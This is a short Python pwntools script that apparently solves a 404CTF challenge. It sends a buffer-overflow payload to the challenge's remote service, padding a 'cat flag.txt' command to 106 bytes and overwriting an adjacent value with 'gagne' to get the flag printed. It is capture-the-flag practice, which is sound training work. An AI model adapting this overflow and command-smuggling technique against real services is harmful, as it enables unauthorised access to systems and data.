from pwn import *

context.log_level = "debug"

lenOverflow = 106
cmd = b"cat flag.txt\x00"
payload = cmd + b'A' * (lenOverflow - len(cmd)) + b'gagne\x00\n'

# p = process(['./course'])
p = remote("challenges.404ctf.fr", 31958)

p.recvuntil(b"udo :\n")
p.send(payload)
data = p.recvall(timeout=2)
print(data.decode())